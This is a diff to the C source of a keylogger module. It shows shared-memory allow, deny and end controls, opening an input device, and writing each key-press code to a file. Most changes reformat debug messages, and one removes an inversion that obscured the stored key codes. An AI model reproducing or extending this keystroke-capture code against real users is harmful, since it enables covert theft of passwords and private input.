@@ -5,6 +5,8 @@
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <fcntl.h>
+#include <errno.h>
+#include <string.h>
 
 #include "keylogger.h"
 #include "../include/types.h"
@@ -25,7 +27,7 @@ void keylogger_allow()
 	if (fd_shm == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_allow] Error opening the shared memory segment\n");
+		printf(P_ERROR "[keylogger_allow] Error opening the shared memory segment\n");
 #endif
 
 		return;
@@ -37,7 +39,7 @@ void keylogger_allow()
 	if (aux == MAP_FAILED)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n");
+		printf(P_ERROR "[keylogger_allow] Error mapping the shared memory segment\n");
 #endif
 		return;
 	}
@@ -57,7 +59,7 @@ void keylogger_deny()
 	if (fd_shm == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_deny] Error opening the shared memory segment\n");
+		printf(P_ERROR "[keylogger_deny] Error opening the shared memory segment\n");
 #endif
 
 		return;
@@ -69,7 +71,7 @@ void keylogger_deny()
 	if (aux == MAP_FAILED)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n");
+		printf(P_ERROR "[keylogger_deny] Error mapping the shared memory segment\n");
 #endif
 		return;
 	}
@@ -89,7 +91,7 @@ void keylogger_end()
 	if (fd_shm == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_end] Error opening the shared memory segment\n");
+		printf(P_ERROR "[keylogger_end] Error opening the shared memory segment\n");
 #endif
 
 		return;
@@ -101,7 +103,7 @@ void keylogger_end()
 	if (aux == MAP_FAILED)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n");
+		printf(P_ERROR "[keylogger_end] Error mapping the shared memory segment\n");
 #endif
 		return;
 	}
@@ -131,7 +133,7 @@ int keylogger_init()
 	if (fd_shm == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error creating the shared memory\n");
+		printf(P_ERROR "[keylogger_init] Error creating the shared memory [%s]\n", strerror(errno));
 #endif
 		return ERROR;
 	}
@@ -142,7 +144,7 @@ int keylogger_init()
 	if (error == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n");
+		printf(P_ERROR "[keylogger_init] Error resizing the shared memory segment\n");
 #endif
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -154,7 +156,7 @@ int keylogger_init()
 	if (shared_memory == MAP_FAILED)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n");
+		printf(P_ERROR "[keylogger_init] Error mapping the shared memory segment\n");
 #endif
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -168,7 +170,7 @@ int keylogger_init()
 	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
 	{
 #ifdef DEBUG
-		printf(P_ERROR " [KEYLOGGER] Error opening device\n");
+		printf(P_ERROR "[keylogger_init] Error opening device\n");
 #endif
 		munmap(shared_memory, sizeof(*shared_memory));
 		shm_unlink(SHM_KEYLOGGER);
@@ -194,7 +196,7 @@ int keylogger_init()
 				if (!file)
 				{
 #ifdef DEBUG
-					printf(P_ERROR " [KEYLOGGER] No file?\n");
+					printf(P_ERROR "[keylogger_init] No file?\n");
 #endif
 					munmap(shared_memory, sizeof(*shared_memory));
 					shm_unlink(SHM_KEYLOGGER);
@@ -203,7 +205,7 @@ int keylogger_init()
 
 				if (EV_KEY == ev[i].type && ev[i].value == 1)
 				{
-					fputc(~ev[i].code, file);
+					fputc(ev[i].code, file);
 				}
 
 				fclose(file);
